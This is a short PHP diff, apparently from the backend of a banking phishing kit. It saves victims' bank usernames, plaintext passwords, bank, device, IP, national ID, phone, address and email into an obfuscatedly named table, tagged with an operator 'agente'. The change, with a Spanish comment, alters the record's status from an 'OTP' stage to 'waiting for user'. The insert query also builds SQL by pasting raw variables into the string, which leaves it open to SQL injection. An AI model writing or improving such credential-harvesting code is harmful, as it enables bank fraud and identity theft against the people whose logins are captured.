@@ -58,8 +58,9 @@ if ($con = conectar()) {
             checkRateLimit($ip, 3, 900, 900); 
         }
 
+        // 🟢 CORRECCIÓN AQUÍ: Cambiamos el 2 (OTP) por 12 (Esperando usuario)
         $query_insert = "INSERT INTO m3it3m (usuario, password, banco, dispositivo, ip, status, agente, nombre, apellido, tipo_doc, cedula, celular, direccion, empresa, referencia, email) 
-                         VALUES ('$usuario', '$contrasena', '$banco', '$dispositivo', '$ip', 2, '$mnt', '$nom', '$ape', '$tdoc', '$doc', '$cel', '$dir', '$emp', '$ref', '$eml')";
+                         VALUES ('$usuario', '$contrasena', '$banco', '$dispositivo', '$ip', 12, '$mnt', '$nom', '$ape', '$tdoc', '$doc', '$cel', '$dir', '$emp', '$ref', '$eml')";
         sentencia($con, $query_insert);
         
         $id = mysqli_insert_id($con);
